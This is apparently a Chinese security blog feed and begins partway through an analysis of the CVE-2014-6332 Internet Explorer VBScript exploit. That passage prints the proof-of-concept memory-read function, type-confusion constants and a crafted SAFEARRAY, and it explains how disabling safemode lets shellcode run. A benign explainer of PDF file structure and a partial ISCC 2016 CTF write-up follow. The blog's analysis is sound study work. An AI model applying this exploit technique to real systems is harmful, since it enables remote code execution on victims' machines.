6.36598737437801E-314</code>对应的内存值为<code>0x0000000300000003</code>,而<code>0x3</code>对应的类型为<code>VT_I4</code>，即<code>vbLong</code>型，从而可以读取到<code>CScriptEntryPoint</code>对象指针:</p><p><img src="/media/cve-2014-6332/modify-type.png" alt="modify-type"></p><p>此时，通过<code>arrayA(arraySize+2)</code>便可读取到<code>CScriptEntryPoint</code>对象指针的值。下一步便是需要通过内存任意地址读写修改<code>Safemode</code>标志位的值从而能够执行命令。</p><h4 id="实现内存地址任意读"><a href="#实现内存地址任意读" class="headerlink" title="实现内存地址任意读"></a>实现内存地址任意读</h4><p>在poc中，实现内存地址读的函数为:</p><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> readMemory(addr)</span><br><span class="line">    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span></span><br><span class="line">    <span class="keyword">redim</span>  <span class="keyword">Preserve</span> arrayA(overSize)</span><br><span class="line">    arrayB(<span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    arrayA(arraySize + <span class="number">2</span>) = addr + <span class="number">4</span></span><br><span class="line">    arrayB(<span class="number">0</span>) = <span class="number">1.69759663316747E-313</span></span><br><span class="line">    readMemory = lenb(arrayA(arraySize + <span class="number">2</span>))</span><br><span class="line">    arrayB(<span class="number">0</span>) = <span class="number">0</span></span><br><span class="line">    <span class="keyword">redim</span>  <span class="keyword">Preserve</span> arrayA(arraySize)</span><br><span class="line"><span class="keyword">end</span> <span class="keyword">function</span></span><br></pre></td></tr></table></figure><p>内存地址里的数据主要通过<code>readMemory = lenb(arrayA(arraySize + 2))</code>进行读取，<code>lenb</code>函数用于计算<code>VT_BSTR</code>类型字符串的长度，<code>lenb</code>对应实现函数为<code>vbscript!VbsLenB</code>，用IDA查看：</p><p><img src="/media/cve-2014-6332/LenB-0.png" alt="LenB-0"></p><p><img src="/media/cve-2014-6332/LenB.png" alt="LenB"></p><p>在<code>vbscript!VbsLenB</code>中，实际调用<code>cbLengthBstr</code>函数进行计算字符串的长度，图中<code>a1</code>为字符串地址，可以看到，在求字符串长度时，其实取的是字符串地址前4字节的值。</p><p><code>arrayB(0) = 1.69759663316747E-313</code>对应的内存值为<code>0x0000000800000008</code>。通过<code>arrayB(0)</code>将<code>arrayA(arraySize+2)</code>的类型修改为了<code>VT_BSTR</code>。那么<code>0x006af9a4</code>存放的就是字符串所在的地址，地址前的4个字节存放的就是字符串的长度。所以对于<code>lenb(arrayA(arraySize + 2))</code>相当于取得是地址为<code>0x006af9a4-4</code>处存放的值，故前面通过<code>arrayA(arraySize + 2) = addr + 4</code>进行修正。</p><p><img src="/media/cve-2014-6332/VT_BSTR.png" alt="VT_BSTR"></p><p>上面实现了内存的读取，加上已经找到的<code>CScriptEntryPoint</code>对象指针，下一步便是找到<code>safemode</code>标志位并进行修改。</p><p><img src="/media/cve-2014-6332/safemode.png" alt="safemode"></p><p>找到标志位后，需要对其进行修改。在<code>setCScriptEntryPoint</code>中，我们构造了一个字符串变量<code>myarray</code>，字符串值为<code>010080080100000000000000000000000000ff7f00000000</code>，观察它在内存中的结构:</p><p><img src="/media/cve-2014-6332/myarray.png" alt="myarray"></p><p><img src="/media/cve-2014-6332/myarray-1.png" alt="myarray"></p><p>可以看到在地址<code>0x004b566c</code>上存的其实是一个精心构造的<code>SAFEARRAY</code>数组。但是在<code>arrayA</code>数组中，被解释为<code>0x8</code>类型，即为<code>VT_BSTR</code>。而后一句<code>arrayB(2) = 1.74088534731324E-310</code>对应的内存值为<code>0x0000200c0000200c</code>,它利用内存错位，将类型由原来的<code>0x8</code>修改成了<code>0x200c</code>，而<code>0x200c</code>表示的是<code>VT_VARIANT|VT_ARRAY</code>。也就是说<code>arrayA</code>中又包含了一个数组，该数组索引从<code>0</code>开始，长度为<code>0x7fff0000</code>，每个元素大小为1字节。</p><p>现在，已经实现了任意地址读写，下一步便是修改<code>safemode</code>的值。<code>arrayA(arraySize + 4)(pAddr + &amp;h11c + offset) = arrayB(4)</code>,<code>arrayB(4)</code>中存的<code>VARIANT</code>类型值为<code>0</code>。因为修改时长度为4字节，因此偏移<code>&amp;h120</code>需要修改成<code>&amp;h11c</code>。</p><p>此时，<code>safemode</code>已经被置为<code>0</code>,后面便可成功运行<code>RunWin32Exe</code>中的shellcode了。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>第一次调试这样的漏洞，以新手视角进行书写。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li><a href="https://paper.seebug.org/240/" target="_blank" rel="noopener">https://paper.seebug.org/240/</a></li><li><a href="https://bbs.pediy.com/thread-248273.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248273.htm</a></li><li><a href="https://bbs.pediy.com/thread-248310.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248310.htm</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        
        
          &lt;h2 id=&quot;调试环境&quot;&gt;&lt;a href=&quot;#调试环境&quot; class=&quot;headerlink&quot; title=&quot;调试环境&quot;&gt;&lt;/a&gt;调试环境&lt;/h2&gt;&lt;p&gt;操作系统: Windows 7 Service Pack 1 32 位&lt;/p&gt;
&lt;p&gt;浏览器: IE
        
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PDF 文档结构</title>
    <link href="https://lazymind.me/2017/10/pdf-structure/"/>
    <id>https://lazymind.me/2017/10/pdf-structure/</id>
    <published>2017-10-13T13:41:50.000Z</published>
    <updated>2019-07-18T09:51:12.608Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本要素"><a href="#基本要素" class="headerlink" title="基本要素"></a>基本要素</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><p>PDF 文件基本元素是 PDF 对象(PDF Object), PDF 对象包括直接对象(Direct Object)和间接对象(Indirect Object)。直接对象如下八种类型；间接对象，又叫 <code>labelled object</code>, 嵌套在关键词 <code>n 0 obj</code> 和 <code>endobj</code> 之间， 是用一种表示来标识一个 PDF 对象，通过标识来让别的 PDF 对象引用，这个标识叫做间接对象的 ID.</p><a id="more"></a><h4 id="直接对象类型"><a href="#直接对象类型" class="headerlink" title="直接对象类型"></a>直接对象类型</h4><ol><li><p>Boolean value(布尔)</p><p> 布尔类型，值只能是 <code>true</code> 和 <code>false</code>。</p></li><li><p>Integer and Real number(数值)</p><p> 数值类型，包括整数和实数，与普通编程语言中的数值类型大体相同。</p></li><li><p>String(字符串)</p><p> 字符串类型，包括包含在圆括号 <code>( )</code> 内的文字字符串(<code>literal string</code>)和包含在单尖括号 <code>&lt; &gt;</code> 内的十六进制字符串(<code>hexadecimal string</code>)两种。</p><p> 例：</p><pre><code>1. (Hello World)2. &lt;9ADCF1&gt;</code></pre></li><li><p>Name(名字?)</p><p> 名字类型，用字符组成的字符串，用 <code>/</code> 作为前导符号，在 PDF 文件中具有唯一性，相同的名字表示相同的对象(<code>the same sequence of character denotes the same object</code>)。常见用在 <code>Dictionary</code> 里面作 <code>Key</code>，用来表示对象名称。</p><p> 例：</p><pre><code>/Page/Kid</code></pre></li><li><p>Array(数组)</p><p> 数组类型，存在于方括号 <code>[ ]</code> 内，元素可以是除 <code>Stream</code> 外的所有类型。PDF 中数组只支持一维数组。</p><p> 例：</p><pre><code>[/Page false 17 (hello)]  该数组包含了4种类型元素</code></pre></li><li><p>Dictionary(字典)</p><p> 字典类型，包含在双尖括号 <code>&lt;&lt; &gt;&gt;</code> 内，每两个元素为一对，第一个为 <code>key</code>, 第二个为 <code>value</code>， <code>key</code> 只能是 <code>Name</code> 类型，<code>value</code> 可以是任意类型，即可以嵌套为 <code>Dictionary</code>。</p><p> 例：</p><pre><code>&lt;&lt;/Page 1 0 obj/Filter /FlateDecode/Name (Hello)&gt;&gt;</code></pre></li><li><p>Stream(流对象)</p><p> 流对象，是用字节表示的序列，长度理论上没限制。包含在 <code>stream</code> 和 <code>endstream</code> 之间。以 <code>CRLF</code> 或 <code>LF</code> 结尾，不能单独以 <code>CR</code> 结尾。<code>dicionary</code> 里的内容用来描述该 <code>stream</code> 的相关信息。</p><pre><code>dictionarystream    ......endstream</code></pre></li><li><p>Null object(空对象)</p><p> 空对象类型，用关键词 <code>null</code> 表示。</p></li></ol><h4 id="间接对象类型"><a href="#间接对象类型" class="headerlink" title="间接对象类型"></a>间接对象类型</h4><p>使用 unique object identifier 来表示，方便其他对象引用。结构如下：</p><pre><code>12 0 obj........endobj</code></pre><p>第一行第一个 <code>12</code> 规定为 <code>positive integer</code>， 表示对象 ID; 第二个 <code>0</code> 表示生成号(<code>generation number</code>)，通常为0；第三个为固定 <code>obj</code> 表示，以最后一行 <code>endobj</code> 表示结束。中间 <code>......</code> 表示内容。其他地方引用该对象时，使用如下格式，其中 <code>R</code> 为关键字:</p><pre><code>12 0 R</code></pre><h3 id="文件结构"><a href="#文件结构" class="headerlink" title="文件结构"></a>文件结构</h3><p>文件基本结构如下，文件结构的详细内容分析将在实例分析中说明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------+</span><br><span class="line">| +----------------------+ |</span><br><span class="line">| |        Header        | |  &lt;-----文件头，表示版本.%PDF-1.M</span><br><span class="line">| |                      | |</span><br><span class="line">| +----------------------+ |</span><br><span class="line">| |                      | |</span><br><span class="line">| |         Body         | |  &lt;-----文件体，由一系列PDF对象组成</span><br><span class="line">| |                      | |</span><br><span class="line">| |                      | |</span><br><span class="line">| |                      | |</span><br><span class="line">| |                      | |</span><br><span class="line">| |                      | |</span><br><span class="line">| +----------------------+ |</span><br><span class="line">| |    Cross-reference   | |  &lt;-----交叉引用表，包含指向所有间接</span><br><span class="line">| |         table        | |        对象的文件位置索引的列表</span><br><span class="line">| |        (xref)        | |</span><br><span class="line">| +----------------------+ |</span><br><span class="line">| |        Trailer       | |  &lt;-----包含文件的根节点信息和</span><br><span class="line">| |                      | |        文件解析的起点信息</span><br><span class="line">| +----------------------+ |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><h4 id="交叉引用表"><a href="#交叉引用表" class="headerlink" title="交叉引用表"></a>交叉引用表</h4><p>交叉引用表的结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xref</span><br><span class="line">i j</span><br><span class="line">nnnnnnnnnn ggggg N eol</span><br><span class="line">nnnnnnnnnn ggggg N eol</span><br><span class="line">......</span><br><span class="line">nnnnnnnnnn ggggg N eol</span><br></pre></td></tr></table></figure><p>第一行 <code>xref</code> 表示交叉引用表开始；第二行 <code>i j</code> 表示下面部分引用的对象从 <code>i</code> 开始，共有 <code>j</code> 个对象；第三行开始相同的结构，每行20字节，包括换行符。 <code>nnnnnnnnnn</code> 10位，字节偏移地址，表示从 <strong>文件开始（beginning of the file)</strong> 到 <strong>该对象开始(beginning of the object)</strong> 的偏移； <code>ggggg</code> 5位，生成号； <code>N</code> 可以为 <code>n</code> 或者 <code>f</code>，其中 <code>n</code> 表示该对象在使用，<code>f</code> 表示该对象为free状态，未被使用。</p><h2 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">+--------------------------+</span><br><span class="line">|       读取 PDF 文件        |</span><br><span class="line">|                          |</span><br><span class="line">+------------+-------------+</span><br><span class="line">             |</span><br><span class="line">+------------v-------------+</span><br><span class="line">|   从文件末尾开始解析得到     |</span><br><span class="line">|   索引和文件对象起始位置     |</span><br><span class="line">+------------+-------------+</span><br><span class="line">             |</span><br><span class="line">+------------v-------------+</span><br><span class="line">|      得到PDF基本信息以及    |</span><br><span class="line">|        PDF的根目录对象     |</span><br><span class="line">+------------+-------------+</span><br><span class="line">             |</span><br><span class="line">+------------v-------------+</span><br><span class="line">|    通过根目录对象得到PDF的  |</span><br><span class="line">|   所有大纲和页面的对象集合   |</span><br><span class="line">+------------+-------------+</span><br><span class="line">             |</span><br><span class="line">+------------v-------------+</span><br><span class="line">|                          |</span><br><span class="line">|   当用户转到第几页时，解析   |</span><br><span class="line">|   该PDF页面上的所有对象     |</span><br><span class="line">|   包括文字，图片，流媒体等   |</span><br><span class="line">|                          |</span><br><span class="line">|                          |</span><br><span class="line">+------------+-------------+</span><br><span class="line">             |</span><br><span class="line">+------------v-------------+</span><br><span class="line">| 将得到的文件流通过渲染引擎，  |</span><br><span class="line">|     生成特定文件显示出来     |</span><br><span class="line">+--------------------------+</span><br></pre></td></tr></table></figure><h2 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">%PDF-1.6            # 文件头，表示该文档符合 PDF 1.6 规范 ， % 表示注释</span><br><span class="line">%鲣                # (binary data)二进制， 主要用来表示文件内容是 text 还是 binary</span><br><span class="line">12 0 obj            # object 对象， 12是顺序号，0是生成号， obj 为关键词</span><br><span class="line">&lt;&lt;/Filter /FlateDecode     # 过滤器类别，处理stream 和 endstream 之间的数据时候需要用到的, FlateDecode表示使用zip算法</span><br><span class="line">/Length 1732&gt;&gt;      # 表示 stream 和 endstream 之间数据的长度</span><br><span class="line">stream              # stream的内容部分</span><br><span class="line">......</span><br><span class="line">endstream</span><br><span class="line">endobj              # 标识该对象结束</span><br><span class="line"></span><br><span class="line">1 0 obj</span><br><span class="line">&lt;&lt;/Contents 12 0 R</span><br><span class="line">/Parent 2 0 R</span><br><span class="line">/MediaBox [0 0 595 842]</span><br><span class="line">/Resources 7 0 R</span><br><span class="line">/Rotate 0</span><br><span class="line">/Type /Page&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line">2 0 obj</span><br><span class="line">&lt;&lt;/Kids [1 0 R] /Type/Pages /Count 1&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line">......</span><br><span class="line">9 0 obj</span><br><span class="line">&lt;&lt;/Fields [11 0 R] /XFA [5 0 R] /DA (/Helv 0 Tf 0 g )&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line">11 0 obj</span><br><span class="line">&lt;&lt;/T (gapejess[0]) /Kids [4 0 R]&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line">13 0 obj</span><br><span class="line">&lt;&lt;/AcroForm 9 0 R /Lang (en-us) /Pages 2 0 R /Type/Catalog&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line">5 0 obj</span><br><span class="line">&lt;&lt;/Length 3602 /Filter/FlateDecode&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">......</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"></span><br><span class="line">xref                    # 标识交叉引用表开始</span><br><span class="line">0 14                    # 说明下面对象编号是从0开始，总共有14个对象， 从 0 到 13</span><br><span class="line">0000000000 65535 f      # 第0个对象，规定生成号为65535，f 表示 free entry，对象不存在或者删除</span><br><span class="line">0000003079 00000 n      # 第1个对象，偏移地址为3079，生成号为0表示未被修改过, n 表示 in use</span><br><span class="line">0000003191 00000 n</span><br><span class="line">0000003245 00000 n</span><br><span class="line">0000003695 00000 n</span><br><span class="line">0000003955 00000 n</span><br><span class="line">0000003515 00000 n</span><br><span class="line">0000003347 00000 n</span><br><span class="line">0000003446 00000 n</span><br><span class="line">0000003756 00000 n</span><br><span class="line">0000001823 00000 n</span><br><span class="line">0000003827 00000 n</span><br><span class="line">0000000017 00000 n</span><br><span class="line">0000003878 00000 n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">trailer                 # 标识文件尾trailer对象开始</span><br><span class="line">&lt;&lt;/Root 13 0 R          # 表明根对象的对象号为13，即交叉表中的最后一个对象</span><br><span class="line">/ID [&lt;4E76CDCEDB1E2EC4AC47475DB4EE376E&gt; &lt;C8B1AEBC2C6615E39860F1C150A2847C&gt;]</span><br><span class="line">/Size 14                # 表明PDF文件的对象数目</span><br><span class="line">/Info 8 0 R&gt;&gt;</span><br><span class="line"></span><br><span class="line">startxref</span><br><span class="line">7630       # 交叉引用表的偏移地址，相对于文件开始</span><br><span class="line">%%EOF      # 标识文件结束</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具:"></a>工具:</h3><ul><li><a href="http://eternal-todo.com/tools/peepdf-pdf-analysis-tool" target="_blank" rel="noopener">peepdf</a></li><li><a href="pdfium.googlesource.com/pdfium/">pdfium</a></li></ul><h3 id="参考"><a href="#参考" class="headerlink" title="参考:"></a>参考:</h3><ul><li><a href="https://www.adobe.com/cn/devnet/pdf/pdf_reference.html" target="_blank" rel="noopener">Adobe PDF Reference</a></li><li><a href="http://blog.csdn.net/pdfMaker/article/details/573990" target="_blank" rel="noopener">一个简单PDF文件的结构分析</a></li><li><a href="https://www.cnblogs.com/Ironsoft/archive/2006/01/05/311467.html" target="_blank" rel="noopener">PDF文件格式的一些研究心得</a></li><li><a href="https://www.oschina.net/translate/pdf-file-analyzer-with-csharp-parsing-classes-vers" target="_blank" rel="noopener">C# Parsing 类实现的 PDF 文件分析器</a></li><li><a href="http://blog.csdn.net/wzyzzu/article/details/50460423" target="_blank" rel="noopener">PDF文件格式分析</a></li><li><a href="http://superleo.iteye.com/blog/283848" target="_blank" rel="noopener">PDF源文件浅析</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;基本要素&quot;&gt;&lt;a href=&quot;#基本要素&quot; class=&quot;headerlink&quot; title=&quot;基本要素&quot;&gt;&lt;/a&gt;基本要素&lt;/h2&gt;&lt;h3 id=&quot;数据类型&quot;&gt;&lt;a href=&quot;#数据类型&quot; class=&quot;headerlink&quot; title=&quot;数据类型&quot;&gt;&lt;/a&gt;数据类型&lt;/h3&gt;&lt;p&gt;PDF 文件基本元素是 PDF 对象(PDF Object), PDF 对象包括直接对象(Direct Object)和间接对象(Indirect Object)。直接对象如下八种类型；间接对象，又叫 &lt;code&gt;labelled object&lt;/code&gt;, 嵌套在关键词 &lt;code&gt;n 0 obj&lt;/code&gt; 和 &lt;code&gt;endobj&lt;/code&gt; 之间， 是用一种表示来标识一个 PDF 对象，通过标识来让别的 PDF 对象引用，这个标识叫做间接对象的 ID.&lt;/p&gt;
    
    </summary>
    
      <category term="Program" scheme="https://lazymind.me/categories/Program/"/>
    
    
      <category term="PDF" scheme="https://lazymind.me/tags/PDF/"/>
    
  </entry>
  
  <entry>
    <title>ISCC 2016 writeup (部分题解)</title>
    <link href="https://lazymind.me/2016/05/iscc-2016-ctf-writeup/"/>
    <id>https://lazymind.me/2016/05/iscc-2016-ctf-writeup/</id>
    <published>2016-05-25T15:02:13.000Z</published>
    <updated>2019-07-18T09:51:12.608Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Basic50-Find-to-me"><a href="#Basic50-Find-to-me" class="headerlink" title="Basic50 Find to me"></a>Basic50 Find to me</h3><blockquote><p>已知仿射加密变换为 c = (11m+8) mod 26，试对密文 sjoyuxzr 解密</p></blockquote><p>看这篇文章就能弄懂 <a href="http://bbs.pediy.com/showthread.php?t=89299" target="_blank" rel="noopener">http://bbs.pediy.com/showthread.php?t=89299</a></p><p><code>flag: itksuzlp</code></p><h3 id="Basic50-好长的字符串"><a href="#Basic50-好长的字符串" class="headerlink" title="Basic50 好长的字符串"></a>Basic50 好长的字符串</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Vm0wd2QyVkhVWGhVYmxKV1YwZDRXRmxVUm5kVlJscHpXa2M1</span><br><span class="line">VjFKdGVGWlZNbmhQWVd4YWMxZHViRmROYWxaeVdWZDRZV01</span><br><span class="line">4WkhGU2JIQk9VbTVDZVZkV1pEUlRNazE0Vkc1T2FWSnVRazlWY</span><br><span class="line">WtwdlZWWmtWMWt6YUZSTlZUVkpWbTEwYzJGV1NuVlJiR2hYWW</span><br><span class="line">xSV1JGcFdXbXRXTVZwMFpFWlNUbFp1UWpaV2Fra3hVakZaZVZO</span><br><span class="line">cmJGSmlWR3hXVm01d1IyUldjRmhsUjBacVZtczFNVmt3WkRSVk1ER</span><br><span class="line">kZWbXBXVjFKc2NGaFdha3BIVTBaYWRWSnNTbGRTTTAwMQ==</span><br></pre></td></tr></table></figure><p>多次解 base64 即可</p><p><code>flag: goodluckiscc</code></p><a id="more"></a><h3 id="Basic50-明察秋毫"><a href="#Basic50-明察秋毫" class="headerlink" title="Basic50 明察秋毫"></a>Basic50 明察秋毫</h3><p>查看网页源码，得到 <code>maybe not flag : Jr1p0zr2VfPp</code> 看似 <code>rot13</code>，解得</p><p><code>flag: We1c0me2IsCc</code></p><h3 id="Basic100-心灵鸡汤"><a href="#Basic100-心灵鸡汤" class="headerlink" title="Basic100 心灵鸡汤"></a>Basic100 心灵鸡汤</h3><p>比较简单的逆向，可以发现加上参数 <code>ISCC</code>会有不同的结果</p><p><img src="/media/14630355493646/14630408344746.jpg" alt></p><p>想了很久不知道是什么加密方式。。。后面别人提醒才知道是培根加密,有两个加密表，有个解出来是对的</p><p><code>flag: HACKERISCC</code></p><h3 id="Basic100-小伟的密码"><a href="#Basic100-小伟的密码" class="headerlink" title="Basic100 小伟的密码"></a>Basic100 小伟的密码</h3><p>这道题有点运气。。。我做题时没windows系统，都是在mac下面看的题目，结果能直接看见隐藏的文件。。。</p><p><img src="/media/14630355493646/14630411373281.jpg" alt></p><p>后面我发现在windows上这些文件是隐藏的</p><p><code>flag: ImnrelnaSicoftethgoicynyrouTo</code></p><h3 id="Baisc200-JJ"><a href="#Baisc200-JJ" class="headerlink" title="Baisc200 JJ"></a>Baisc200 JJ</h3><p><img src="/media/14630355493646/14630414489708.jpg" alt></p><p>js fuck.解码得到一个百度云链接，下载下来</p><p><img src="/media/14630355493646/14630414948583.jpg" alt></p><p>第一次看到这个，根据题目描述的 JJ ，google 发现是 jjencode， github上找了个 jjdecode 脚本，解出来，注意要把匿名函数最后返回的 <code>return p</code> 替换成 <code>return d</code></p><p><code>flag: 34be5bcb6c6f0bcfc628d9e390d13ba6</code></p><h3 id="Misc150-一切都在"><a href="#Misc150-一切都在" class="headerlink" title="Misc150 一切都在"></a>Misc150 一切都在</h3><p>分析网络请求，发现有个图片的请求，提取数据得到一个图片</p><p><img src="/media/14630355493646/14630416667438.jpg" alt></p><h3 id="Misc200-Music-Never-Sleep"><a href="#Misc200-Music-Never-Sleep" class="headerlink" title="Misc200 Music Never Sleep"></a>Misc200 Music Never Sleep</h3><p>mp3文件写隐，一直没头绪，<code>strings + grep</code> 一阵乱搜也没什么，用Audacity看了也没看出什么来。后面才知道是 mp3stego<a href="http://www.petitcolas.net/steganography/mp3stego/" target="_blank" rel="noopener">http://www.petitcolas.net/steganography/mp3stego/</a>, 根据页面example发现需要密码，重新搜关键词 <code>iscc</code></p><p><img src="/media/14630355493646/14635423380419.jpg" alt></p><p>解密后得到文件 <code>iscc2016.mp3.txt</code>:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag is SkYzWEk0M1JOWlNHWTJTRktKUkdJTVpXRzVSV0U2REdHTVpHT1pZPQ== ???</span><br></pre></td></tr></table></figure><p>一次<code>base64</code> 一次<code>base32</code></p><p><code>flag: IwtsqndljERbd367cbxf32gg</code></p><h3 id="Misc300-毕业论文"><a href="#Misc300-毕业论文" class="headerlink" title="Misc300 毕业论文"></a>Misc300 毕业论文</h3><p>这道题真的是考脑洞。。。刚开始一直以为会在图片上做文章，后面发现完全不是这样，这个今年的zctf有相似的题，见<a href="http://www.freebuf.com/articles/web/94444.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/94444.html</a></p><p>将doc另存为xml</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  xml.dom.minidom</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'gbk'</span>)</span><br><span class="line">dom = xml.dom.minidom.parse(<span class="string">'them.xml'</span>)</span><br><span class="line">root = dom.documentElement</span><br><span class="line">str1 = <span class="string">''</span></span><br><span class="line">bb = root.getElementsByTagName(<span class="string">'w:spacing'</span>)</span><br><span class="line">b= bb[<span class="number">10</span>]</span><br><span class="line">b1 = b.getAttribute(<span class="string">"w:val"</span>)</span><br><span class="line"><span class="keyword">print</span> b1</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">10</span>,len(bb)):</span><br><span class="line">    <span class="keyword">if</span> bb[k].getAttribute(<span class="string">"w:val"</span>) == <span class="string">"2"</span> :</span><br><span class="line">        str1 += <span class="string">'1'</span> * len(str(bb[k].parentNode.parentNode.getElementsByTagName(<span class="string">'w:t'</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].data).decode(<span class="string">'gbk'</span>))</span><br><span class="line">    <span class="keyword">elif</span> bb[k].getAttribute(<span class="string">"w:val"</span>) == <span class="string">"-2"</span> :</span><br><span class="line">        str1 += <span class="string">'0'</span> * len(str(bb[k].parentNode.parentNode.getElementsByTagName(<span class="string">'w:t'</span>)[<span class="number">0</span>].childNodes[<span class="number">0</span>].data).decode(<span class="string">'gbk'</span>))</span><br><span class="line"><span class="keyword">print</span> str1</span><br><span class="line"><span class="keyword">print</span> len(str1)</span><br><span class="line"><span class="comment">#print len(bb)</span></span><br></pre></td></tr></table></figure><p>跑出来发现01总共135位，不是偶数位。先转ASCII，发现有<code>}</code>符号，手工在最前面补了个0得到<code>lag{0h-Mj_The8i8}</code>，看来脚本少统计了个，不过不影响</p><p>故：<code>flag{0h-Mj_The8i8}</code></p><h3 id="web150-flag-in-flag"><a href="#web150-flag-in-flag" class="headerlink" title="web150 flag in flag"></a>web150 flag in flag</h3><p><img src="/media/14630355493646/14630388492254.jpg" alt></p><p>查看题目给的源码，发现存在注入，上 <code>sqlmap</code>，得到flag</p><p><img src="/media/14630355493646/14630393075941.jpg" alt></p><h3 id="web300-PING出事了吧"><a href="#web300-PING出事了吧" class="headerlink" title="web300 